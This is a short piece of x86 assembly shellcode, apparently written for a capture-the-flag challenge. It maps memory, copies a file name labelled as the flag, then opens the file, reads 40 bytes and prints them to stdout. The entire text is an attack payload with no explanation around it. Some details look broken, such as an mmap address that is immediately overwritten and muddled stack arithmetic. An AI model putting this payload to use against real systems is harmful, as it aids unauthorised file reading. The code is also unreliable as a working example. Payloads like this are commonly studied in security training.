  //  start at 0x8049220
  add esp, 100
  mov eax, 0
  mov [esp+20], eax
  mov eax, -1
  mov [esp+16], eax
  mov eax, 0x22
  mov [esp+12], eax
  mov eax, PROT_WRITE
  mov [esp+8], eax
  mov eax, 0x2000
  mov [esp+4], eax
  mov eax, 0x70404000
  mov ebx, esp
  mov eax, SYS_mmap
  int 0x80
  sub esp, 100


  mov ecx, 40
  mov esi, esp
  mov edi, eax
  rep movsb # copy the flag

  mov edi, eax

  mov ebx, edi
  mov ecx, 0
  mov edx, 0
  mov eax, SYS_open      # open
  int 0x80

  mov ebx, eax
  mov eax, SYS_read      # read content
  lea ecx, [esp-0x30]
  mov edx, 40
  int 0x80

  mov eax, SYS_write
  mov ebx, 1
  lea ecx, [esp-0x30]
  mov edx, 40
  int 0x80

  mov eax, 1
  int 0x80
